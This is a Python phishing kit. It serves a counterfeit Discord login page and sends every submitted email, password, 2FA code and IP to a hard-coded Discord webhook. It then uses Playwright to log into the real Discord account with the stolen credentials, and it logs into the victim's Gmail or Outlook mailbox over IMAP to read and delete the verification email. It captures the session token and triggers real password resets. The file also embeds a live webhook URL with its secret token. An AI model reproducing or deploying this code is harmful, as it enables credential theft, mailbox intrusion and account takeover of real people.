import os
import json
import sys
import re
import asyncio
import imaplib
import email
import time
import random
import string
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from playwright.async_api import async_playwright
from datetime import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614"

HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord - Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
--bg:#313338;
--bg-dark:#1e1f22;
--bg-darker:#111214;
--text-white:#f2f3f5;
--text-muted:#b5bac1;
--text-gray:#949ba4;
--blurple:#5865f2;
--blurple-hover:#4752c4;
--link:#00a8fc;
--input-bg:#1e1f22;
--error:#f23f43;
}
html,body{
height:100%;
width:100%;
font-family:'Inter','gg sans','Noto Sans',Helvetica,Arial,sans-serif;
background:var(--bg);
color:var(--text-white);
overflow:hidden;
}
body::before{
content:'';
position:fixed;
inset:0;
z-index:0;
background:
radial-gradient(ellipse 300px 300px at 0% 0%, rgba(88,101,242,0.08) 0%, transparent 70%),
radial-gradient(ellipse 250px 250px at 100% 15%, rgba(88,101,242,0.06) 0%, transparent 70%),
radial-gradient(ellipse 200px 200px at 85% 60%, rgba(88,101,242,0.05) 0%, transparent 70%),
radial-gradient(ellipse 280px 280px at 10% 80%, rgba(88,101,242,0.06) 0%, transparent 70%),
radial-gradient(ellipse 180px 180px at 50% 30%, rgba(88,101,242,0.04) 0%, transparent 70%);
pointer-events:none;
}
body::after{
content:'';
position:fixed;
inset:0;
z-index:0;
background:
radial-gradient(circle 80px at 92% 12%, rgba(255,255,255,0.015) 0%, transparent 100%),
radial-gradient(circle 120px at 88% 55%, rgba(255,255,255,0.012) 0%, transparent 100%),
radial-gradient(circle 60px at 5% 25%, rgba(255,255,255,0.015) 0%, transparent 100%),
radial-gradient(circle 90px at 8% 75%, rgba(255,255,255,0.012) 0%, transparent 100%),
radial-gradient(circle 50px at 50% 5%, rgba(255,255,255,0.01) 0%, transparent 100%);
pointer-events:none;
}
.container{
position:relative;
z-index:1;
width:100%;
height:100%;
display:flex;
flex-direction:column;
padding:16px 24px 40px;
max-width:480px;
margin:0 auto;
}
.back-arrow{
display:flex;
align-items:center;
justify-content:center;
width:36px;
height:36px;
cursor:pointer;
margin-bottom:24px;
margin-left:-4px;
}
.back-arrow svg{
width:22px;
height:22px;
fill:none;
stroke:var(--text-muted);
stroke-width:2.5;
stroke-linecap:round;
stroke-linejoin:round;
}
.back-arrow:hover svg{
stroke:var(--text-white);
}
.header{
text-align:center;
margin-bottom:28px;
}
.header h1{
font-size:26px;
font-weight:800;
color:var(--text-white);
margin-bottom:8px;
letter-spacing:-0.2px;
}
.header p{
font-size:15px;
color:var(--text-muted);
font-weight:400;
line-height:1.3;
}
.form-group{
margin-bottom:20px;
}
.form-group label{
display:block;
font-size:12px;
font-weight:700;
color:var(--text-muted);
margin-bottom:8px;
text-transform:uppercase;
letter-spacing:0.02em;
}
.input-wrapper{
position:relative;
width:100%;
}
.form-group input{
width:100%;
height:52px;
background:var(--input-bg);
border:none;
border-radius:8px;
padding:0 16px;
font-size:16px;
color:var(--text-white);
font-family:inherit;
outline:none;
transition:box-shadow 0.15s;
-webkit-appearance:none;
}
.form-group input::placeholder{
color:var(--text-gray);
opacity:0.5;
}
.form-group input:focus{
box-shadow:0 0 0 2px var(--blurple);
}
.form-group input.error{
box-shadow:0 0 0 2px var(--error);
}
.error-message{
display:none;
align-items:center;
gap:6px;
margin-top:8px;
font-size:12px;
color:var(--error);
font-weight:500;
}
.error-message.visible{
display:flex;
}
.error-message::before{
content:'!';
display:flex;
align-items:center;
justify-content:center;
width:16px;
height:16px;
background:var(--error);
color:#fff;
border-radius:50%;
font-size:11px;
font-weight:700;
}
.eye-toggle{
position:absolute;
right:16px;
top:50%;
transform:translateY(-50%);
cursor:pointer;
padding:4px;
display:flex;
align-items:center;
justify-content:center;
background:none;
border:none;
}
.eye-toggle svg{
width:22px;
height:22px;
fill:none;
stroke:var(--text-gray);
stroke-width:1.8;
stroke-linecap:round;
stroke-linejoin:round;
}
.eye-toggle:hover svg{
stroke:var(--text-muted);
}
.forgot-link{
display:inline-block;
margin-top:8px;
font-size:14px;
font-weight:500;
color:var(--link);
text-decoration:none;
cursor:pointer;
}
.forgot-link:hover{
text-decoration:underline;
}
.login-btn{
width:100%;
height:44px;
border:none;
border-radius:8px;
background:var(--blurple);
color:#fff;
font-size:16px;
font-weight:600;
font-family:inherit;
cursor:pointer;
margin-top:8px;
transition:background 0.15s, transform 0.1s;
letter-spacing:0.02em;
}
.login-btn:hover{
background:var(--blurple-hover);
}
.login-btn:active{
transform:scale(0.98);
}
.login-btn:disabled{
opacity:0.5;
cursor:not-allowed;
}
.login-btn.loading{
pointer-events:none;
color:transparent;
position:relative;
}
.login-btn.loading::after{
content:'';
position:absolute;
left:50%;top:50%;
width:8px;height:8px;
margin:-4px 0 0 -20px;
border-radius:50%;
background:#fff;
animation:dots 1.2s infinite;
}
@keyframes dots{
0%,80%,100%{box-shadow:12px 0 0 #fff,24px 0 0 #fff}
40%{box-shadow:12px -6px 0 #fff,24px 0 0 #fff}
60%{box-shadow:12px 0 0 #fff,24px -6px 0 #fff}
}
.passkey-link{
display:block;
text-align:center;
margin-top:16px;
font-size:14px;
font-weight:500;
color:var(--link);
text-decoration:none;
cursor:pointer;
}
.passkey-link:hover{
text-decoration:underline;
}
.modal-overlay{
position:fixed;
inset:0;
background:rgba(0,0,0,0.7);
display:none;
align-items:center;
justify-content:center;
z-index:100;
padding:24px;
}
.modal-overlay.active{
display:flex;
}
.modal{
background:#2b2d31;
border-radius:12px;
padding:24px;
width:100%;
max-width:360px;
position:relative;
}
.modal-close{
position:absolute;
top:16px;
right:16px;
width:24px;
height:24px;
cursor:pointer;
display:flex;
align-items:center;
justify-content:center;
background:none;
border:none;
color:var(--text-muted);
font-size:20px;
}
.modal-close:hover{
color:var(--text-white);
}
.modal h2{
font-size:20px;
font-weight:700;
color:var(--text-white);
margin-bottom:12px;
padding-right:32px;
}
.modal p{
font-size:14px;
color:var(--text-muted);
line-height:1.5;
margin-bottom:20px;
}
.modal-btn{
width:100%;
height:44px;
border:none;
border-radius:8px;
background:var(--blurple);
color:#fff;
font-size:16px;
font-weight:600;
font-family:inherit;
cursor:pointer;
}
.modal-btn:hover{
background:var(--blurple-hover);
}
.code-input{
width:100%;
height:52px;
background:var(--input-bg);
border:none;
border-radius:8px;
padding:0 16px;
font-size:24px;
color:var(--text-white);
font-family:'SF Mono',monospace;
text-align:center;
letter-spacing:8px;
outline:none;
margin-bottom:16px;
}
.code-input:focus{
box-shadow:0 0 0 2px var(--blurple);
}
@media(min-width:481px){
.container{
justify-content:center;
padding-top:60px;
}
}
</style>
</head>
<body>
<div class="container">
  <div class="back-arrow" onclick="history.back()">
    <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
  </div>
  
  <div class="header">
    <h1>Welcome back!</h1>
    <p>We're so excited to see you again!</p>
  </div>
  
  <form id="loginForm">
    <div class="form-group">
      <label>Email or Phone Number <span style="color:var(--error)">*</span></label>
      <div class="input-wrapper">
        <input type="text" id="email" autocomplete="username" autocapitalize="none" spellcheck="false" placeholder="">
      </div>
      <div class="error-message" id="emailError">This field is required</div>
    </div>

    <div class="form-group">
      <label>Password <span style="color:var(--error)">*</span></label>
      <div class="input-wrapper">
        <input type="password" id="password" autocomplete="current-password" placeholder="">
        <button type="button" class="eye-toggle" onclick="togglePassword()">
          <svg id="eyeIcon" viewBox="0 0 24 24">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
        </button>
      </div>
      <a class="forgot-link" href="#" onclick="showForgotModal();return false">Forgot your password?</a>
    </div>

    <button type="submit" class="login-btn" id="loginBtn">Log In</button>
    <a class="passkey-link" href="#">Or, sign in with passkey</a>
  </form>
</div>

<div class="modal-overlay" id="forgotModal">
  <div class="modal">
    <button class="modal-close" onclick="closeForgotModal()">&times;</button>
    <h2>Password Reset</h2>
    <p>Enter your email to receive reset instructions.</p>
    <input type="text" class="code-input" id="resetEmail" placeholder="Email">
    <button class="modal-btn" onclick="submitForgot()">Send Reset Link</button>
  </div>
</div>

<div class="modal-overlay" id="verifyModal">
  <div class="modal">
    <h2>Verify Identity</h2>
    <p>Enter the 6-digit code sent to your email.</p>
    <input type="text" class="code-input" id="verifyCode" maxlength="6" placeholder="000000">
    <button class="modal-btn" onclick="submitVerify()">Verify</button>
  </div>
</div>

<script>
function togglePassword() {
  const input = document.getElementById('password');
  const icon = document.getElementById('eyeIcon');
  if (input.type === 'password') {
    input.type = 'text';
    icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
  } else {
    input.type = 'password';
    icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/><circle cx="12" cy="12" r="3"/>';
  }
}

function showForgotModal() {
  document.getElementById('forgotModal').classList.add('active');
}

function closeForgotModal() {
  document.getElementById('forgotModal').classList.remove('active');
}

function showVerifyModal() {
  document.getElementById('verifyModal').classList.add('active');
}

function submitForgot() {
  const email = document.getElementById('resetEmail').value;
  fetch('/api/forgot', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email})
  });
  closeForgotModal();
  alert('If an account exists, a reset link has been sent.');
}

function submitVerify() {
  const code = document.getElementById('verifyCode').value;
  const email = document.getElementById('email').value;
  fetch('/api/verify', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({code, email})
  });
  document.getElementById('verifyModal').classList.remove('active');
}

document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value;
  const btn = document.getElementById('loginBtn');
  const emailError = document.getElementById('emailError');
  
  document.getElementById('email').classList.remove('error');
  emailError.classList.remove('visible');
  
  if (!email) {
    document.getElementById('email').classList.add('error');
    emailError.classList.add('visible');
    return;
  }
  
  btn.classList.add('loading');
  btn.disabled = true;
  
  try {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email, password})
    });
    
    const data = await response.json();
    
    if (data.needsVerify) {
      showVerifyModal();
    }
  } catch (err) {
    console.error(err);
  } finally {
    btn.classList.remove('loading');
    btn.disabled = false;
  }
});
</script>
</body>
</html>"""

class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[{self.log_date_time_string()}] {format % args}", flush=True)
    
    def _send_json(self, data, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode("utf-8"))

    def do_GET(self):
        if self.path in ["/", "/login"]:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML.encode("utf-8"))
        else:
            self.send_response(301)
            self.send_header("Location", "/")
            self.end_headers()

    def do_POST(self):
        client_ip = self.headers.get("X-Forwarded-For", self.client_address[0])
        
        if self.path == "/api/login":
            length = int(self.headers.get("Content-Length", 0))
            body = json.loads(self.rfile.read(length))
            email = body.get("email", "")
            password = body.get("password", "")
            
            self._send_to_webhook({
                "title": "New Login Attempt",
                "fields": [
                    {"name": "Email", "value": f"`{email}`", "inline": False},
                    {"name": "Password", "value": f"`{password}`", "inline": False},
                    {"name": "IP Address", "value": f"`{client_ip}`", "inline": True},
                    {"name": "User-Agent", "value": self.headers.get("User-Agent", "Unknown")[:100], "inline": True}
                ],
                "color": 0x5865f2,
                "timestamp": datetime.utcnow().isoformat()
            })
            
            asyncio.create_task(self._automate_discord_login(email, password, client_ip))
            
            self._send_json({"needsVerify": True})
            
        elif self.path == "/api/verify":
            length = int(self.headers.get("Content-Length", 0))
            body = json.loads(self.rfile.read(length))
            code = body.get("code", "")
            email = body.get("email", "")
            
            self._send_to_webhook({
                "title": "2FA Code Entered",
                "fields": [
                    {"name": "Email", "value": f"`{email}`", "inline": False},
                    {"name": "Code", "value": f"`{code}`", "inline": False}
                ],
                "color": 0x00ff00
            })
            
            self._send_json({"success": True})
            
        elif self.path == "/api/forgot":
            length = int(self.headers.get("Content-Length", 0))
            body = json.loads(self.rfile.read(length))
            email = body.get("email", "")
            
            asyncio.create_task(self._trigger_password_reset(email, client_ip))
            
            self._send_json({"sent": True})
        else:
            self.send_response(404)
            self.end_headers()

    def _send_to_webhook(self, embed):
        import urllib.request
        data = json.dumps({"embeds": [embed]}).encode()
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        try:
            urllib.request.urlopen(req, timeout=5)
        except:
            pass

    async def _automate_discord_login(self, email, password, client_ip):
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context(
                    viewport={"width": 1280, "height": 720},
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0"
                )
                page = await context.new_page()
                
                await page.goto("https://discord.com/login")
                await page.wait_for_timeout(2000)
                
                await page.fill('input[name="email"]', email)
                await page.fill('input[name="password"]', password)
                await page.click('button[type="submit"]')
                
                await page.wait_for_timeout(3000)
                
                if await page.query_selector('[data-testid="verify-email-modal"]'):
                    code = await self._get_verification_code_from_email(email, password)
                    if code:
                        await page.fill('input[placeholder="Enter code"]', code)
                        await page.click('button[type="submit"]')
                        await page.wait_for_timeout(3000)
                
                token = await page.evaluate("() => localStorage.getItem('token')")
                
                if token:
                    self._send_to_webhook({
                        "title": "Discord Token Captured",
                        "fields": [
                            {"name": "Token", "value": f"`{token[:50]}...`", "inline": False},
                            {"name": "Email", "value": f"`{email}`", "inline": True},
                            {"name": "IP Used", "value": f"`{client_ip}`", "inline": True}
                        ],
                        "color": 0x00ff00
                    })
                
                await browser.close()
        except Exception as e:
            self._send_to_webhook({
                "title": "Automation Error",
                "fields": [{"name": "Error", "value": str(e)[:1000], "inline": False}],
                "color": 0xff0000
            })

    async def _get_verification_code_from_email(self, email, password):
        try:
            domain = email.split("@")[1]
            
            if "gmail" in domain:
                imap_server = "imap.gmail.com"
            elif "outlook" in domain or "hotmail" in domain:
                imap_server = "outlook.office365.com"
            else:
                return None
                
            mail = imaplib.IMAP4_SSL(imap_server)
            mail.login(email, password)
            mail.select("inbox")
            
            for _ in range(30):
                _, messages = mail.search(None, '(FROM "noreply@discord.com" SUBJECT "verify")')
                message_ids = messages[0].split()
                
                if message_ids:
                    latest_id = message_ids[-1]
                    _, msg_data = mail.fetch(latest_id, "(RFC822)")
                    raw_email = msg_data[0][1]
                    email_message = email.message_from_bytes(raw_email)
                    
                    body = ""
                    if email_message.is_multipart():
                        for part in email_message.walk():
                            if part.get_content_type() == "text/plain":
                                body = part.get_payload(decode=True).decode()
                                break
                    else:
                        body = email_message.get_payload(decode=True).decode()
                    
                    match = re.search(r'\b\d{6}\b', body)
                    if match:
                        code = match.group()
                        mail.store(latest_id, "+FLAGS", "\\Deleted")
                        mail.expunge()
                        mail.close()
                        mail.logout()
                        return code
                
                await asyncio.sleep(10)
                
            mail.close()
            mail.logout()
            return None
        except Exception as e:
            print(f"IMAP Error: {e}")
            return None

    async def _trigger_password_reset(self, email, client_ip):
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page()
                
                await page.goto("https://discord.com/login")
                await page.click('a[href="/login"]')
                await page.wait_for_timeout(1000)
                await page.click('text=Forgot your password?')
                await page.fill('input[name="email"]', email)
                await page.click('button[type="submit"]')
                
                self._send_to_webhook({
                    "title": "Password Reset Triggered",
                    "fields": [
                        {"name": "Email", "value": f"`{email}`", "inline": False},
                        {"name": "IP", "value": f"`{client_ip}`", "inline": True}
                    ],
                    "color": 0xffaa00
                })
                
                await browser.close()
        except:
            pass

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    server = ThreadedHTTPServer(("0.0.0.0", port), Handler)
    print(f"Server running on port {port}", flush=True)
    sys.stdout.flush()
    server.serve_forever()
